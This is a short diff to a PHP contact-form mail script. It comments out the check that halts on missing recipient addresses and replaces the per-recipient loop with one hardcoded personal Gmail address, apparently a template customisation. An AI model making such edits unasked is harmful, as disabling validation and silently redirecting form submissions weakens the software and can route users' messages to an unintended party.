@@ -9,7 +9,7 @@ try {
     preg_match_all("/([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)/", $recipients, $addresses, PREG_OFFSET_CAPTURE);
 
     if (!count($addresses[0])) {
-        die('MF001');
+        //die('MF001');
     }
 
     if (preg_match('/^(127\.|192\.168\.)/', $_SERVER['REMOTE_ADDR'])) {
@@ -74,9 +74,8 @@ try {
     $mail->From = $_SERVER['SERVER_ADDR'];
     $mail->FromName = $_SERVER['SERVER_NAME'];
 
-    foreach ($addresses[0] as $key => $value) {
-        $mail->addAddress($value[0]);
-    }
+
+        $mail->addAddress("mimadl3a@gmail.com");
 
     $mail->CharSet = 'utf-8';
     $mail->Subject = $subject;
